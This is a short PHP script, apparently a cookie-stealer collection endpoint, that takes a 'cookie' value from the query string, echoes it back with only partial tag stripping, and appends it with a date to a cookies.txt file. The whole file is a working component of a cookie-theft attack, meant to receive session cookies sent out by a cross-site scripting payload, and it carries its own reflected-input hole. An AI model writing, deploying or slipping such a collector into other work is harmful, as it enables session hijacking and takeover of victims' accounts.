<?php

date_default_timezone_set("Etc/GMT+3");

if(isset($_GET['cookie']))
{
	$cookie = $_GET['cookie'];
	$content = strip_tags($cookie, "<input>");
	echo $content;
	$data = date("d/m/y");
	$file = fopen("cookies.txt", "a");
	fwrite($file, "[$data] --> cookie \n COOKIE: $content\n\n");
	fclose($file);
}

?>